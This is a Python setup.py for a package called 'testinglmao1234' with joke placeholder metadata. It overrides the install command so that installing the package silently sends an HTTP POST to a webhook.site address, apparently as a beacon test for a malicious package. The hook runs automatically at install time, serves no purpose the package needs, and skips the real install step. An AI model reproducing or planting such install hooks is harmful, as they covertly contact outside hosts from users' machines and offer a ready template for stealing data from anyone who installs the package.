from setuptools import find_packages, setup
from setuptools.command.install import install


class CustomInstallCommand(install):
    def run(self):
      import requests
      url = 'https://webhook.site/4f1e79e9-b44a-4b47-80db-aa658f176f8b'
      final_payload = "$age working"
      r = requests.post(url, params="format=json", data=final_payload)

        




setup(
  name = 'testinglmao1234',
  packages=find_packages(),
  version = '0.69',
  description = ':clown:',
  author = ':clown:',
  install_requires=["sockets","requests"],
  cmdclass={
    'install': CustomInstallCommand,
  },
  author_email = 'github@gmail.com',
  url = 'https://github.com',
  keywords = [],
  classifiers = [],

)
